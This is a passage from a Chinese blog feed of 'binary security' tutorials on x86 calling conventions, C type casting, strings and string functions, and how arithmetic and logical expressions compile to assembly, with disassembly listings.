class="line">mov ecx,1 </span><br><span class="line">call @ILT+5(Plus) (0040100a)</span><br><span class="line"></span><br><span class="line">ret 8 ;外平栈，平衡传入参数的一部分</span><br></pre></td></tr></table></figure><h3 id="thiscall"><a href="#thiscall" class="headerlink" title="thiscall"></a>thiscall</h3><p>C++类成员函数缺省的调用约定</p><p>thiscall是唯一一个不能明确指定的函数修饰，因为thiscaall不是关键字。由于成员函数调用还有一个this指针。所以需要特殊处理</p><blockquote><p>参数从右向左⼊栈</p><p>如果参数个数不确定，this指针在所有参数压栈后被压⼊堆栈。如果参数个数确定，</p><p>this指针通过ecx传递给被调⽤者。</p><p>如果参数个数不确定，调⽤者清理堆栈，否则函数⾃⼰清理堆栈</p><p>对于参数个数固定情况下，类似于stdcall，不定时则类似cdecl</p></blockquote><h3 id="naked-call"><a href="#naked-call" class="headerlink" title="naked call"></a>naked call</h3><p>很少见，自己百度。一般用于实模式驱动程序设计</p><h2 id="函数调用约定的常见问题"><a href="#函数调用约定的常见问题" class="headerlink" title="函数调用约定的常见问题"></a>函数调用约定的常见问题</h2><p>如果定义的约定和使用的约定不一致，则将导致堆栈被破坏，导致严重问题</p><ul><li>函数原型声明和函数体定义不一致</li><li>DLL【动态链接库】导入函数的时候声明了不同的函数约定</li></ul><p>调用函数的代码和被调用函数必须采用相同的函数的调用约定，这样程序才能正常的运行。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言语句讲解（6）</title>
      <link href="/2023/05/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-6-C%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/05/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-6-C%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-类型与类型强转"><a href="#1-类型与类型强转" class="headerlink" title="1.类型与类型强转"></a>1.类型与类型强转</h1><p>强制转换就是把变量从一种类型转化成另外一种类型的数据。</p><h2 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h2><p>方法：(想要转换的类型)变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> sum = <span class="number">17</span>, count = <span class="number">5</span>;</span><br><span class="line"> <span class="type">double</span> mean;</span><br><span class="line"> mean = (<span class="type">double</span>) sum / count;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Value of mean : %f\n&quot;</span>, mean );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sum的值首先被转化未double性，然后除以count得到一个double型的值</p><p>这样的转换是显性的。转换也可以是隐型的</p><h2 id="整数提升"><a href="#整数提升" class="headerlink" title="整数提升"></a>整数提升</h2><p>也就是把小于int 或者 unsigned int 的整数转化成 跟高的过程</p><p>编译器首先会整数提升，如果操作数类型不同，则把他们转化为层次最高的类型</p><ul><li>int-&gt;unsigned int-&gt;long-&gt;unsigned long-&gt;unsigned long long -&gt;float-&gt;double-&gt;long double</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i = <span class="number">17</span>;</span><br><span class="line"> <span class="type">char</span> c = <span class="string">&#x27;c&#x27;</span>; <span class="comment">/* ascii 值是 99 */</span></span><br><span class="line"> <span class="type">int</span> sum;</span><br><span class="line"> sum = i + c;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Value of sum : %d\n&quot;</span>, sum );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到的结果是：Value of sum : 116</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i = <span class="number">17</span>;</span><br><span class="line"> <span class="type">char</span> c = <span class="string">&#x27;c&#x27;</span>; <span class="comment">/* ascii 值是 99 */</span></span><br><span class="line"> <span class="type">float</span> sum;</span><br><span class="line"> sum = i + c;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Value of sum : %f\n&quot;</span>, sum );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到的结果是：Value of sum : 116.000000</p><p>在这里 c 首先被转化成整数 也就是99 但是最后的值是float型的，所以应用常用算数转化，编译器会把i 和 c 转化未浮点型，然后相加得到一个浮点数</p><h1 id="2-字符与字符串"><a href="#2-字符与字符串" class="headerlink" title="2.字符与字符串"></a>2.字符与字符串</h1><h2 id="字符串和数组"><a href="#字符串和数组" class="headerlink" title="字符串和数组"></a>字符串和数组</h2><p>C中要声明一个数组，需要指定元素的类型和元素的数量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type arrayName [ arraySize ];</span><br><span class="line">比如：</span><br><span class="line"><span class="type">int</span> balance[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//初始化数组</span></span><br><span class="line"><span class="type">double</span> balance[<span class="number">5</span>] = &#123;<span class="number">1000.0</span>, <span class="number">2.0</span>, <span class="number">3.4</span>, <span class="number">7.0</span>, <span class="number">50.0</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>字符串常量</strong></p><p>以NULL字节结尾的0个或者多个字符组成的序列。</p><p>比如：”Hello!”、”\aWarning!\a”、”123abc\n”、””</p><p>最后自动补充\0 来表示 NULL  也就是结束</p><p>*在C语言中通常声明一个char类型的指针并将其初始化为一个字符串常量的方式来访问一个字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">　　<span class="type">char</span> *message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">　　<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,message);</span><br><span class="line">　　<span class="keyword">while</span>(*message != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">　　　　<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,*message++);</span><br><span class="line">　　&#125;</span><br><span class="line">　　<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">　　<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：hello world<br>            hello world</p><h2 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h2><p>用于存放字符的数组就是字符数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> charArray[] = &#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;; <span class="comment">// 声明并初始化⼀个字符数组</span></span><br><span class="line"><span class="type">char</span> charArray[] = <span class="string">&quot;Hello World!&quot;</span>; <span class="comment">// 声明并初始化⼀个字符数组</span></span><br></pre></td></tr></table></figure><p>1.字符串常量是一个字符数组，但是内容和长度在初始化的时候就已经固定了，不能变。可以通过一致指向字符串常量第一个元素的指针来访问该字符串常量</p><p>2.字符数组是一个用于存放字符的数组，字符数组的值是可以改变的。</p><h2 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h2><p>#include &lt;string.h&gt;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">memchr</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *str, <span class="type">int</span> c, <span class="type">size_t</span> n)</span> <span class="comment">//在参数 str 所指向的字符串的</span></span><br><span class="line">前 n 个字节中搜索第⼀次出现字符 c（⼀个⽆符号字符）的位置</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">memcmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *str1, <span class="type">const</span> <span class="type">void</span> *str2, <span class="type">size_t</span> n)</span> <span class="comment">//把 str1 和</span></span><br><span class="line">str2 的前 n 个字节进⾏⽐较</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span> <span class="comment">//从 src 复制 n 个字符</span></span><br><span class="line">到 dest</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *str, <span class="type">int</span> c, <span class="type">size_t</span> n)</span> <span class="comment">//复制字符 c（⼀个⽆符号字符）到参数</span></span><br><span class="line">str 所指向的字符串的前 n 个字符</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> <span class="comment">//把 src 所指向的字符串追加到 dest</span></span><br><span class="line">所指向的字符串的结尾</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span> <span class="comment">//把 src 所指向的字符</span></span><br><span class="line">串追加到 dest 所指向的字符串的结尾，直到 n 字符⻓度为⽌</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> *<span class="title function_">strchr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> c)</span><span class="comment">//在参数 str 所指向的字符串中搜索第⼀次出</span></span><br><span class="line">现字符 c（⼀个⽆符号字符）的位置</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span> *str2)</span> <span class="comment">//把 str1 所指向的字符串和</span></span><br><span class="line">str2 所指向的字符串进⾏⽐较</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span> *str2, <span class="type">size_t</span> n)</span> <span class="comment">//把 str1 和</span></span><br><span class="line">str2 进⾏⽐较，最多⽐较前 n 个字节</span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> <span class="title function_">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="comment">//计算字符串 str 的⻓度，直到空结束字符，但不包</span></span><br><span class="line">括空结束字符</span><br></pre></td></tr></table></figure><h1 id="3-C语言表达式"><a href="#3-C语言表达式" class="headerlink" title="3.C语言表达式"></a>3.C语言表达式</h1><h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><p>对应的汇编指令是ADD</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c;</span><br><span class="line"> c=a+b;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int a = 1, b = 2, c;</span><br><span class="line">00C61875 mov dword ptr [a],1 </span><br><span class="line">00C6187C mov dword ptr [b],2 </span><br><span class="line"> c = a + b;</span><br><span class="line">00C61883 mov eax,dword ptr [a] </span><br><span class="line">00C61886 add eax,dword ptr [b] </span><br><span class="line">00C61889 mov dword ptr [c],eax </span><br><span class="line"> printf(&quot;%d&quot;, c);</span><br><span class="line">00C6188C mov eax,dword ptr [c] </span><br><span class="line">00C6188F push eax </span><br><span class="line">00C61890 push offset string &quot;%d&quot; (0C67B30h) </span><br><span class="line">00C61895 call _printf (0C610D2h)</span><br></pre></td></tr></table></figure><p>[a],[b],[c]是a，b，c的偏移地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">include&lt;stdio.h&gt;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> c;</span><br><span class="line"> c=<span class="number">1</span>+<span class="number">2</span>;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int c;</span><br><span class="line"> c = 1 + 2;</span><br><span class="line">00EA1875 mov dword ptr [c],3 </span><br><span class="line"> printf(&quot;%d&quot;, c);</span><br><span class="line">00EA187C mov eax,dword ptr [c] </span><br><span class="line">00EA187F push eax </span><br><span class="line">00EA1880 push offset string &quot;%d&quot; (0EA7B30h) </span><br><span class="line">00EA1885 call _printf (0EA10D2h)</span><br></pre></td></tr></table></figure><p>这里1+2，常量的运算在编译的过程中就已经处理完。</p><h2 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h2><p>减法运算的指令是sub ， 计算机在运算减法的时候是将这个转化为补码变成加法来运算</p><p>2-1 =&gt; 2+（1的反码+1）【也就是补码】</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c;</span><br><span class="line"> c = b-a;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, c);</span><br><span class="line"> getchar();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int a = 1, b = 2, c;</span><br><span class="line">00391875 mov dword ptr [a],1 </span><br><span class="line">0039187C mov dword ptr [b],2 </span><br><span class="line"> c = b-a;</span><br><span class="line">00391883 mov eax,dword ptr [b] </span><br><span class="line">00391886 sub eax,dword ptr [a] </span><br><span class="line">00391889 mov dword ptr [c],eax </span><br><span class="line"> printf(&quot;%d&quot;, c);</span><br><span class="line">0039188C mov eax,dword ptr [c] </span><br><span class="line">0039188F push eax </span><br><span class="line">00391890 push offset string &quot;%d&quot; (0397B30h) </span><br><span class="line">00391895 call _printf (03910D2h)</span><br></pre></td></tr></table></figure><h2 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h2><p>乘法的指令：imul 和 mul</p><p>imul 对应的是有符号的乘法，mul 对应的是无符号的乘法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c,d,e;</span><br><span class="line"> c = b*a;</span><br><span class="line"> d = b * (-a);</span><br><span class="line"> e = b * <span class="number">2</span>;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d,%d，%d&quot;</span>, c,d,e);</span><br><span class="line"> getchar();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int a = 1, b = 2, c,d,e;</span><br><span class="line">00E21865 mov dword ptr [a],1 </span><br><span class="line">00E2186C mov dword ptr [b],2</span><br><span class="line"> c = b*a;</span><br><span class="line">00E21873 mov eax,dword ptr [b] </span><br><span class="line">00E21876 imul eax,dword ptr [a] </span><br><span class="line">00E2187A mov dword ptr [c],eax </span><br><span class="line"> d = b * (-a);</span><br><span class="line">00E2187D mov eax,dword ptr [a] </span><br><span class="line">00E21880 neg eax </span><br><span class="line">00E21882 imul eax,dword ptr [b] </span><br><span class="line">00E21886 mov dword ptr [d],eax </span><br><span class="line"> e = b * 2;</span><br><span class="line">00E21889 mov eax,dword ptr [b] </span><br><span class="line">00E2188C shl eax,1 </span><br><span class="line">00E2188E mov dword ptr [e],eax</span><br></pre></td></tr></table></figure><p><em>NEG</em>：把操作数按位取反加一 （可以用来求一个数的相反数)</p><p><em>shl</em>:左移指令，左移一位就是乘以2</p><h2 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h2><p>除法的指令：idiv 和 div</p><p>idiv 对应的是有符号的乘法，div 对应的是无符号的乘法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c,d,e;</span><br><span class="line"> c = b/a;</span><br><span class="line"> d = b / (-a);</span><br><span class="line"> e = b /<span class="number">2</span>;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>, c,d,e);</span><br><span class="line"> getchar();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int a = 1, b = 2, c,d,e;</span><br><span class="line">00304535 mov dword ptr [a],1 </span><br><span class="line">0030453C mov dword ptr [b],2 </span><br><span class="line"> c = b/a;</span><br><span class="line">00304543 mov eax,dword ptr [b] </span><br><span class="line">00304546 cdq </span><br><span class="line">00304547 idiv eax,dword ptr [a] </span><br><span class="line">0030454A mov dword ptr [c],eax </span><br><span class="line"> d = b / (-a);</span><br><span class="line">0030454D mov ecx,dword ptr [a] </span><br><span class="line">00304550 neg ecx </span><br><span class="line">00304552 mov eax,dword ptr [b] </span><br><span class="line">00304555 cdq </span><br><span class="line">00304556 idiv eax,ecx </span><br><span class="line">00304558 mov dword ptr [d],eax </span><br><span class="line"> e = b /2;</span><br><span class="line">0030455B mov eax,dword ptr [b] </span><br><span class="line">0030455E cdq </span><br><span class="line">0030455F sub eax,edx </span><br><span class="line">00304561 sar eax,1 </span><br><span class="line">00304563 mov dword ptr [e],eax</span><br></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/oBuYiSeng/article/details/50349139">https://blog.csdn.net/oBuYiSeng/article/details/50349139</a></p><p><em>cdq</em>: 是一个让很多人感到困惑的指令。  这个指令把 EAX 的第 31 bit 复制到 EDX 的每一个 bit 上。 它大多出现在除法运算之前。它实际的作用只是把EDX的所有位都设成EAX最高位的值。也就是说，当EAX &lt;80000000, EDX 为00000000；当EAX &gt;= 80000000， EDX 则为FFFFFFFF。</p><p>例如 :<br>         假设 EAX 是 FFFFFFFB (-5) ，它的第 31 bit (最左边) 是 1，<br>         执行 CDQ 后， CDQ 把第 31 bit 复制至 EDX 所有 bit<br>         EDX 变成 FFFFFFFF<br>        这时候， EDX:EAX 变成 FFFFFFFF FFFFFFFB ，它是一个 64 bit 的大型数字，数值依旧是 -5。</p><pre><code>    EDX:EAX,这里表示EDX，EAX连用表示64位数</code></pre><p>也就是说：cdq是扩展字节的指令</p><p>在除以2的时候，使用了sar右移的指令，方便得一批~</p><h2 id="自增和自减"><a href="#自增和自减" class="headerlink" title="自增和自减"></a>自增和自减</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 6</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">while</span> (i &lt; MAX)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"> i++;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int i=0;</span><br><span class="line">00684535 mov dword ptr [i],0 </span><br><span class="line"> while (i &lt; MAX)</span><br><span class="line">0068453C cmp dword ptr [i],6 </span><br><span class="line">00684540 jge __$EncStackInitStart+42h (068455Eh) </span><br><span class="line"> &#123;</span><br><span class="line"> printf(&quot;%d\n&quot;, i);</span><br><span class="line">00684542 mov eax,dword ptr [i] </span><br><span class="line">00684545 push eax </span><br><span class="line">00684546 push offset string &quot;%d&quot; (0687BD0h) </span><br><span class="line">0068454B call _printf (06810D2h) </span><br><span class="line">00684550 add esp,8 </span><br><span class="line"> i++;</span><br><span class="line">00684553 mov eax,dword ptr [i] </span><br><span class="line">00684556 add eax,1 </span><br><span class="line">00684559 mov dword ptr [i],eax </span><br><span class="line"> &#125;</span><br><span class="line">0068455C jmp __$EncStackInitStart+20h (068453Ch) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>jge</em>:大于等于就跳，这里用来跳出循环</p><p><em>inc</em>:自加一</p><h2 id="运算逻辑关系"><a href="#运算逻辑关系" class="headerlink" title="运算逻辑关系"></a>运算逻辑关系</h2><p>jmp 跳转有关的指令，很多。</p><p>比如：je jz js jnz jne … 遇到的时候不知道可以去百度</p><p>并且这种有关系的跳转指令，一般都要和cmp 和 test 一下。</p><p>test：俩操作数进行<strong>与</strong>运算.</p><p>cmp：俩操作数进行<strong>减法</strong>运算.</p><p>大概知道就好了，后面遇到了在查。</p><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ul><li>与&amp;&amp;</li><li>或||</li><li>非!</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(!i) <span class="comment">//真</span></span><br><span class="line"><span class="number">1</span>==<span class="number">2</span>||<span class="number">1</span>==<span class="number">1</span> <span class="comment">//真</span></span><br><span class="line"><span class="number">1</span>==<span class="number">2</span>&amp;&amp;<span class="number">1</span>==<span class="number">1</span> <span class="comment">//假</span></span><br></pre></td></tr></table></figure><h2 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h2><p>三目运算符</p><p>exp1? exp2:exp3</p><p>1为真执行 2  ；1为假执行3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">1</span>,a=<span class="number">2</span>,c=<span class="number">3</span>,d;</span><br><span class="line"> <span class="keyword">if</span> (i !=MAX)</span><br><span class="line"> &#123;</span><br><span class="line"> d = (a == c) ? i : a;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, d);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span 